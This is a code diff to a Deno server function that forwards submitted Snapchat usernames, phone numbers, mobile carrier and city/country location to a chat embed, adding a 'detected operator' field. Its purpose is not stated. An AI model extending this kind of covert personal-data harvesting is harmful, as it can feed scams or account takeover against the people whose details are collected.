@@ -12,7 +12,7 @@ Deno.serve(async (req) => {
 
   const base44 = createClientFromRequest(req);
   const body = await req.json();
-  const { snapchat, telephone, operateur, submissionId } = body;
+  const { snapchat, telephone, operateur, submissionId, detectedOperator } = body;
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
   const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
@@ -64,7 +64,8 @@ Deno.serve(async (req) => {
     color: operatorColors[operateur] || 16776960,
     fields: [
       { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
-      { name: "📡 Opérateur", value: operateur, inline: true },
+      { name: "📡 Opérateur sélectionné", value: operateur, inline: true },
+      { name: "✅ Opérateur détecté", value: detectedOperator || operateur, inline: true },
       { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🌍 Pays", value: country, inline: true },
       { name: "🏙️ Ville", value: city, inline: true },
